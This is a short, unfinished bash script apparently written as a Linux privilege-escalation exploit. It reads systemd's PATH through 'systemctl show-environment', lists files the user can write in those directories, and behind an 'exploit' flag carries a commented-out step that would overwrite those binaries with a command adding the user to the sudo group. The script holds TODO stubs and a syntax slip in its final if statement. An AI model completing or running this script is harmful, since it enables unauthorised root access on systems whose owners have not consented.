#! /bin/bash

exploit=true

writable=''

# running this command will define a PATH variable
# containing directories where systemctl binaries are stored,
# separated by colons
eval $(systemctl show-environment) 

# loop through each directory in the PATH variable
for dir in ${PATH//:/ }; do
	# if we have write access to the directory,
	# loop through each file within the directory
	# keeping track of writable files
	# TODO: check if this user owns anything, if so give write perms
	if [[ -w $dir ]]; then
		cd $dir
		for file in *; do
			if [[ -f $file ]] && [[ -w $file ]]; then
				writable+=${dir}/${file}$'\n'
			fi
		done
	fi
done


if [[ "$exploit" = true ]] then
	echo "modifying ${writable}"
	# TODO: get username to give user sudo perms
	# echo usermod -aG sudo $user > $writable
fi
